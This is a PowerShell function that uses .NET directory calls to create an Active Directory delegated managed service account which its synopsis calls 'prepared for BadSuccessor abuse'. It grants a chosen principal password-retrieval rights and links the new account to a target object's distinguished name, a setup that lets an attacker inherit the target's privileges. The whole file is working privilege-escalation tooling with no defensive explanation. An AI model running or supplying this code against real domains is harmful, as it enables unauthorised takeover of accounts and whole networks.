function New-dMSA {
    <#
    .SYNOPSIS
        Creates a new msDS-DelegatedManagedServiceAccount (dMSA) in a specified path using .NET in PowerShell,
        which is prepared for BadSuccessor abuse.
        No AD PowerShell Module required.

    .DESCRIPTION

    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [string]$Path,
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName)]
        [string]$DNSHostName,
        [Parameter(ValueFromPipelineByPropertyName)]
        [string]$Domain = 'nothing.lol',
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [string]$TargetDN,
        [Parameter(Mandatory, ValueFromPipelineByPropertyName)]
        [string]$PrincipalAllowedToRetrieveManagedPassword
    )

    begin {
        if ($Domain -eq 'nothing.lol') {
            $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        $parentPath = 'OU=dMSAs,OU=Misconfigs,DC=domain,DC=root'
        $childClassName = 'msDS-DelegatedManagedServiceAccount'
    }

    process {
        # Build nTSecurityDescriptor for msDS-GroupMSAMembership
        $DirEntry = [System.DirectoryServices.DirectoryEntry]::New("LDAP://$Domain")
        $DirSearcher = [System.DirectoryServices.DirectorySearcher]::New($DirEntry)
        $DirSearcher.Filter = "(samaccountname=$PrincipalAllowedToRetrieveManagedPassword)"
        $Account = $DirSearcher.FindOne()
        $SID = [System.Security.Principal.SecurityIdentifier]::new($Account.Properties.objectsid[0], 0)
        $SD = [System.Security.AccessControl.RawSecurityDescriptor]::new("O:S-1-5-32-544D:(A;;0xf01ff;;;$SID)")
        $descriptor = [byte[]]::new($SD.BinaryLength)
        $SD.GetBinaryForm($descriptor, 0)
        # [ADSI] is a shortcut for [System.DirectoryServices.DirectoryEntry]
        $OU = [ADSI]"LDAP://$Path"
        $child = $OU.get_Children()
        $dMSA = $child.add("CN=$Name", $childClassName)
        # dMSA schema systemMustContain (2): msDS-DelegatedMSAState; msDS-ManagedPasswordInterval;
        $dMSA.Properties['msDS-DelegatedMSAState'].Value = 2 # 0 is the default value
        $dMSA.Properties['msDS-ManagedPasswordInterval'].Value = 30  # 30 is the default value
        $dMSA.Properties['sAMAccountName'].Value = $Name + '$'
        $dMSA.Properties['dNSHostName'].Value = $Name + '.' + $Domain
        $dMSA.Properties['msDS-GroupMSAMembership'].Value = $descriptor
        $dMSA.Properties['msDS-ManagedAccountPrecededByLink'].Value = $TargetDN
        $dMSA.Properties['msDS-SupportedEncryptionTypes'].Value = 0x1C
        $dMSA.Properties['userAccountControl'].Value = 0x1000
        $dMSA.CommitChanges()
    }
}
